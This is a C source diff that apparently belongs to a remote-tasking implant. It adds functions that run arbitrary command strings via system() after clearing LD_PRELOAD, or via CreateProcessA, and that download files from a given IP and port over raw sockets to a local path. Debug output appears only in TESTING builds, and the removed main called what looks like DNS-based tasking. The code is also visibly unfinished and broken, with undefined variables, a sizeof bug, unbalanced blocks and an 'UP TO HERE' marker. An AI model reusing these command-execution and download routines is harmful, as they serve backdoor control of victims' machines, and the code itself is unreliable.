@@ -94,12 +94,30 @@ void runtask(char *task) {
 }
 */
 
+
 /* Runtask for Linux */
 void runtask(char *task)
 {
+#ifdef LINUX_VERSION
     unsetenv("LD_PRELOAD");
     system(task);
+#endif
+#ifdef WINDOWS_VERSION
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si,sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi,sizeof(pi));
+    char *cmd = "c:\\Windows\\notepad.exe";
+    CreateProcessA(NULL, task, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi );
+#endif
 }
+
+void makepath(char* dest, int destlen, char* front, char* back) {
+  _snprintf(dest, sizeof(dest), "%s%s", front, back);
+
+}
+
 
 int get_content_length(char *response)
 {
@@ -137,8 +155,214 @@ void base64decode(char **in, char **out)
 {
 }
 
-extern void check_dns_tasks();
+void webrequest(char* ip, int port, char* path, char* outpath) {
 
-int main() {
-    check_dns_tasks();
+#ifdef WINDOWS_VERSION
+
+    WSADATA wsaData;
+    SOCKET sock = INVALID_SOCKET;
+    int iResult;
+    int recvbuflen = 1024;
+
+    struct addrinfo *result = NULL,
+                    *ptr = NULL,
+                    hints;
+
+    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
+    if (iResult != 0) {
+        printf("WSAStartup failed with error: %d\n", iResult);
+        return;
+    }
+
+    ZeroMemory( &hints, sizeof(hints) );
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    // Resolve the server address and port
+    iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
+    if ( iResult != 0 ) {
+        printf("getaddrinfo failed with error: %d\n", iResult);
+        WSACleanup();
+        return;
+    }
+
+    // UP TO HERE
+    sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
+    if (sock == INVALID_SOCKET) {
+        printf("socket failed with error: %ld\n", WSAGetLastError());
+        WSACleanup();
+        return;
+    }
+    
+    iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+    if (iResult == SOCKET_ERROR) {
+        printf("Couldn't connect to server");
+        closesocket(ConnectSocket);
+        WSACleanup();
+        return;
+
+    }
+
+    freeaddrinfo(result);
+
+    if (tmp < 0)
+    {
+#ifdef TESTING
+        printf("Socket Error\n");
+#endif
+        close(sockfd);
+    }
+    else
+    {
+        // Send request
+        _snprintf(request, sizeof(request), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", torequest, ME);
+        iResult = send(sock, request, strlen(request), 0);
+
+        sleep(1);
+        int tmp = recv(sockfd, inbuff, sizeof(inbuff), 0); // probably have the full header portion here.
+
+        // Find the Content-Length
+        int toread = get_content_length(inbuff);
+        if (toread == -1)
+        {
+#ifdef TESTING
+            printf("didn't find content-length\n");
+#endif
+            return;
+        }
+
+        unlink(outpath); // Delete if already exists
+        fh = fopen(outpath, "w");
+
+        int sofar = 0;
+
+        char *start = strstr(inbuff, "\r\n\r\n");
+        if (start == NULL)
+        {
+#ifdef TESTING
+            printf("Couldn't find the boundary between response and body\n");
+#endif
+            return;
+        }
+        start += 4; // Get past the \r\n\r\n
+        int len_of_header = (unsigned long int)start - (unsigned long int)inbuff;
+
+        int tmp2 = fwrite(start, sizeof(char), tmp - len_of_header, fh);
+#ifdef TESTING
+        printf("Wrote %d bytes\n", tmp2);
+#endif
+        sofar = tmp2;
+
+        while (sofar < toread)
+        {
+            sleep(1); // This may be too long for effective comms.
+            tmp = recv(sock, inbuff, sizeof(inbuff), 0);
+#ifdef TESTING
+            printf("Received %d bytes\n", tmp);
+#endif
+        sofar += tmp;
+
+        if (tmp > 0)
+        {
+            tmp2 = fwrite(inbuff, sizeof(char), tmp, fh);
+#ifdef TESTING
+            printf("Wrote %d bytes\n", tmp2);
+#endif
+        }
+    }
+#ifdef TESTING
+    printf("Done writing, closing file");
+#endif
+    fclose(fh);
+    closesocket(sock);
+    WSACleanup();
+}
+#endif
+
+#ifdef LINUX_VERSION
+    int sockfd;
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0)
+        {
+#ifdef TESTING
+            printf("Error opening socket\n");
+#endif
+        }
+        // bzero(&servaddr, sizeof(servaddr));  //Commented but may need it.
+        servaddr.sin_family = AF_INET;
+        servaddr.sin_addr.s_addr = inet_addr(ip);
+        servaddr.sin_port = htons(port);
+
+        int tmp = connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));
+
+        if (tmp < 0)
+        {
+#ifdef TESTING
+            printf("Socket Error\n");
+#endif
+            close(sockfd);
+        }
+        else
+        {
+        // Send request
+            _snprintf(request, sizeof(request), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", torequest, ME);
+            send(sockfd, request, strlen(request), 0);
+
+            sleep(1);
+            int tmp = recv(sockfd, inbuff, sizeof(inbuff), 0); // probably have the full header portion here.
+
+            // Find the Content-Length
+            int toread = get_content_length(inbuff);
+            if (toread == -1)
+            {
+#ifdef TESTING
+                printf("didn't find content-length\n");
+#endif
+            }
+
+            unlink(outpath); // Delete if already exists
+            fh = fopen(outpath, "w");
+
+            int sofar = 0;
+
+            char *start = strstr(inbuff, "\r\n\r\n");
+            if (start == NULL)
+            {
+#ifdef TESTING
+                printf("Couldn't find the boundary between response and body\n");
+#endif
+            }
+            start += 4; // Get past the \r\n\r\n
+            int len_of_header = (unsigned long int)start - (unsigned long int)inbuff;
+
+            int tmp2 = fwrite(start, sizeof(char), tmp - len_of_header, fh);
+#ifdef TESTING
+            printf("Wrote %d bytes\n", tmp2);
+#endif
+            sofar = tmp2;
+
+            while (sofar < toread)
+            {
+                sleep(1); // This may be too long for effective comms.
+                tmp = recv(sockfd, inbuff, sizeof(inbuff), 0);
+#ifdef TESTING
+                printf("Received %d bytes\n", tmp);
+#endif
+                sofar += tmp;
+
+                if (tmp > 0)
+                {
+                    tmp2 = fwrite(inbuff, sizeof(char), tmp, fh);
+#ifdef TESTING
+                    printf("Wrote %d bytes\n", tmp2);
+#endif
+                }
+            }
+#ifdef TESTING
+            printf("Done writing, closing file");
+#endif
+            fclose(fh);
+        }
+#endif
 }
